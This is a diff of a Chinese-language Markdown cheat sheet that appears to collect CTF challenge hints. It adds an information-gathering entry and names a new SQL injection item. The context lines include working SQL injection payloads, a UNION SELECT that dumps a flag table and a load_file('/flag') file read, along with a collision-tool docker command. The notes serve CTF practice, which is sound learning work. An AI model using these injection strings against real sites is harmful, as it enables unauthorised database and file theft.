@@ -21,6 +21,8 @@
 > .git 泄露
 ### 信息收集-010
 > 响应头
+### 信息收集-011
+> F12 爆破 `*.jpg`
 
 ## HTTP
 ### HTTP-001
@@ -191,4 +193,4 @@ docker run --rm -it -v $PWD:/work -w /work -u $UID:$GID brimstone/fastcoll  -o m
 > `?id=-1' union select * from (select 1)A join((select group_concat(flag) from ctf.flag)B join(select 3)C) --+`
 ### SQL注入-015
 > 文件读写, `?id=-1' union select 1,2,(select load_file('/flag'))--+`
-### 
+### SQL注入-016
